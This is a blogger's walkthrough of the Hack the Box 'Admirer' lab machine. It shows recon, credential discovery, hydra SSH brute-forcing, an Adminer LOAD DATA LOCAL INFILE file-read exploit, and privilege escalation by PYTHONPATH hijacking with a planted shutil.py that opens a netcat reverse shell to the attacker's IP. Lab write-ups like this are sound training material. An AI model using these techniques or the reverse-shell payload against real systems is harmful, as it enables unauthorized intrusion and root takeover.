---
title: Hack the Box Admirer Write-Up
tags:
- writeup
- hackthebox
image: /images/admirer/info.png
---

Did you know that the metaphor *"Going down the rabbit hole"* was popularized by the story of Alice in Wonderland? Now you may ask why is that relevant? Well... if you have solved this box you would get why I am saying that. For those who havn't solved it... You will know in a few minutes. The thing I have noticed is that hack the box measures the difficulty on the basis of techinical skills required not the amount of will power. And this is exactly what this box was about. **SHEER. WILL. POWER.**

Lets begin this journey.
<!--more-->
<img src="/images/admirer/info.png"/>

Starting with the nmap scan

```
nmap -A -p- -T4 -Pn 10.10.10.187

Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-05 16:32 IST
Nmap scan report for 10.10.10.187
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (EdDSA)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

So we have FTP, SSH and HTTP. I try ftp with anonymous access but that didn't work. Moving on to the web server.

<img src="/images/admirer/website.png" />

Alright got some pretty images and I look around and see a form in the about section but that is a dud. Browsing to robots.txt.

<img src="/images/admirer/robot.png">

We are not allowed access to a folder named "admin-dir". Noted. Then I try running dirbuster but didn't find anything interesting. Next I looked around the html and javascript files for any version number on the software used in the website and googled some keywords. Nothing.

I came back to the admin-dir and remember from somewhere that if you don't have access to a directory doesn't mean you don't have access to its contents. So I run dirbuster on the path "http://10.10.10.187/admin-dir/". I found a contacts.txt

```
contacts.txt
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb

```

Found a bunch of Big Bang Theory refernces but not the creds that I was looking for. I try other lists like medium2.3 and big 2.3 but that was taking too long.

I read the robots.txt again and something just clicked! I realized that it says contacts and creds and I have already found the contacts in contacts.txt but not the creds... So what if I try something like creds.txt?maybe some other synonyms? **yes!** I was able to find the creds in a file called credentials.txt with the power of guessing.

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

Sometimes brute-force is not the only answer. And I was like Ohhh so many passwords! This makes it # RabbitHole1. I go and start wpscan to look for wordpress on the website. It says the site does not run wordpress. No success even with some permutations and combinations. 

Next I try ftp with the found credentials. And this time I am able to connect. 

```
ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:lol): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (18.5558 MB/s)
ftp>
```

Similarly I get the other file too.
Next I decompress the html file and look inside

```
admirer/html$ ls
assets  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r
admirer/html/utility-scripts$ ls
admin_tasks.php  db_admin.php  info.php  phptest.php
```

# Rabbit Holes (Optional Read)
I found some database credentails in dump.sql 

```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```

And I found a **ton** of credentials in all the files. Here is the list of all of them so far

```
[Bank Account]
waldo.11
Ezy]m27}OREc$
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P
[FTP account]
ftpuser
%n?4Wz}R$tTF7
[Wordpress account]
admin
w0rdpr3ss01!
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
$servername = "localhost";
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";
```

So I try SSH login brute-force with a list of all the passwords and username as "waldo".

```
hydra -L user -P pass -t 4 10.10.10.187 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-06 10:32:59
[DATA] max 4 tasks per 1 server, overall 4 tasks, 120 login tries (l:20/p:6), ~30 tries per task
[DATA] attacking ssh://10.10.10.187:22/
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 56 to do in 00:01h, 4 active
[22][ssh] host: 10.10.10.187   login: ftpuser   password: %n?4Wz}R$tTF7
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-06 10:34:57
http://10.10.10.187/utility-scripts/adminer.php
```

But when I tried to login with the found creds I got connection closed. NOT invalid password but connection closed. That makes it #RabbitHole2
because I tried to get it to work but to no success.

Next I browse to #RabbitHole3 i.e admin_tasks.php in the `utility-scripts` directory. There were some juicy functions but none of them worked and I kept editing the html to get them to work.

<img src="/images/admirer/rabbit.png" />

Since we already have the source code of admin_task.php I saw that there was a system command in there and I kept trying to bypass the checks to get some rce :(

# Optional Read End

I had no lead even after going through all those files. So I just start googling keywords from the files that I think could get me something. Finally when I googled "admirerdb" which was the name of the mysql database which I got from the dump.sql. The first result was something known as "adminer.php". So I tried browsing to this in all the directories I knew. I got a hit on `/utility-scripts/adminer.php`

<img src="/images/admirer/adminer.png" />

I was excited! Only to get teary eyed seconds later. None of the credentials worked. I see a version number 4.6.2 and at this point after going through so many hoops I was tired and hoped that I was near the user flag. **NOPE**. 

I did find an exploit for adminer.php but to exploit it I had to setup a mysql server first. [Reference to exploit](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f).

Exploit Explaination:

So the exploit was a local file read vulnerability. When you login to your sql server you can execute all the actions that only affect your own server. BUT using the query "LOAD DATA LOCAL INFILE" you can load the data inside a local file (i.e the files present on your victim machine) to a table in our database and if you know the structure of the file system or location of some sensiive files you can use that knowledge to load it's data to your own database. 

```
LOAD DATA LOCAL INFILE '/etc/passwd' 
INTO TABLE test.test
FIELDS TERMINATED BY "\n"
```

So I set up my my sql server (*lol*) and [allow remote access](https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql) to it. Now I just make a new database and a new table with one column of varchar datatype. 

Next was guessing the path of the files I can read. I tried `/etc/passwd` but It gave an error that I can't go outside current directory. I try other directories but found that I am able to read only the contents of `/var/www/html` directory. Alright then I just kept on trying the name of the files I knew existed. And I found a new set of credentials (hopefully usefull) in the index.php file.

<img src="/images/admirer/query1.png" >

I try them at ssh once again and this time it was a success.

```
ssh waldo@10.10.10.187
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Sep  7 17:48:05 2020 from 10.10.14.55
waldo@admirer:~$ whoami
waldo
```

We are the user named waldo and browsing to home directory we are finally able to get the user flag.

Privilege Escalation Time!
So I do the basics first like `sudo -l` and we already have a clue.

```
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Hey that is the script that the admin_tasks.php was running in the system command. We are able to use sudo on it and run it as root. Lets look at what we can do. It has options such as view crontabs or backup database,webdata,passwd file etc. So First I try viewing the crontabs of root.

```
# m h  dom mon dow   command
*/3 * * * * rm -r /tmp/*.* >/dev/null 2>&1
*/3 * * * * rm /home/waldo/*.p* >/dev/null 2>&1
```

Hmm... it is removing a file with what looks like a ".py" extension but there is no file like that in our home directory. Moving on I use other options for backing up the shadow file and database but we don't have the permissions to read any of the backups. The only thing that stands out is this line of code in the admin_tasks.sh script.

```
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

It is the function to backup the web data. It is running a python file called backup.py which is in the same directory as the admin_tasks script. Here is how it looks.

```
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

I knew that I am not in a rabbit hole because the clue was pretty strong that I have to do something with these 2 files only. Here is where my python coding experience came in handy. I knew that a script looks for imports first in it's current directory. But we don't have the write permissions for the `/opt/scripts/`. Then I decide to checkout the `PYTHONPATH` with `echo $PYTHONPATH` which returned nothing, meaning that the variable is not set and we can manipulate it.

Some recap on PYTHONPATH. It is an environment variable that tells Python about where to look for imported files. So if we are able to manipulate that and tell python to look for our own created mailicious file and import it instead we can try and run it as root. Here is some [reference for that](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8). (ours is the 3rd scenario according to this article)

I do exactly that first make another folder first in side the /tmp directory, and make file named "shutil.py" with contents like this

```
#!/usr/bin/python3

import os

def make_archive(a,b,c):
	os.system("nc 10.10.14.61 1234 -e /bin/bash")
```

Next we just need to set the environment variable and run the 6th option(the option which runs the python script) in the admin_tasks script. Also setup a netcat listener in another tab.

Now we just do something like

```
sudo PYTHONPATH=/tmp/newshutil ./admin_tasks.sh 6
```

we set the PYTHONPATH  as /tmp/newshutil which means now every script will look there first for any imported files. And then we run the admin script with the option 6 to run the backup.py file with root privileges.
And...

```
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.10.187 59722 received!
whoami
root
```

Rooting this was one of the really fun processes but not a big fan of the user flag. I really liked the box due to the amount of tricks that had to be used. It had the lengthiest process to get the user flag among all the boxes I have solved yet. I have been at it for about TWO days and I am going to sleep now. Good Night!







